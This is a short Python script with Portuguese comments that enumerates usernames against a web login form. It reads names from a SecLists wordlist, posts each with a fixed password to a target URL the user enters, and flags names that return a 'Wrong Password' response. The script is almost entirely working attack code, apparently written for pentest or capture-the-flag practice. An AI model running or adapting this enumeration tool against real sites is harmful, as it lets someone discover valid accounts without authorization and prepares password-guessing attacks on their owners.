import requests, threading

targetUrl = input("Insira o Url do alvo: ")

#Caminho da lista de usernames pra testar
file_path = "/usr/share/seclists/Usernames/Names/names.txt";

def teste():
    print("aaa");


#Começa a força bruta
def testar_name(num):
    try:
        with open(file_path, "r") as f:
            i = 0;
            for line in f:
                username = line.strip()
                
                #Pulando linhas vazias
                if not username: 
                    continue
                
                if i < num:
                    i += 1
                    continue
                else:
                    i = 0

                print("Testando nome: ", username)

                # POST
                data = {
                    "username": username,
                    "password": "password" #fixa apenas para testes
                }

                # Mandando o POST request
                response = requests.post(targetUrl, data=data)

                # Ver se deu bão
                if "Wrong Password" in response.text:
                    print(f"Username achado: {username}")
                elif "wrong username" in response.text:
                    continue
            
    except FileNotFoundError:
        print(f"Erro: O arquivo '{file_path}' não existe")
    except requests.RequestException as e:
        print(f"Erro: Ocorreu um erro com o request HTTP: {e}")

for i in range(1, 2):

    t = threading.Thread(target=testar_name, args=(i,))
    #t = threading.Thread(target=teste)
    t.start()
    t.join()
print("Done")
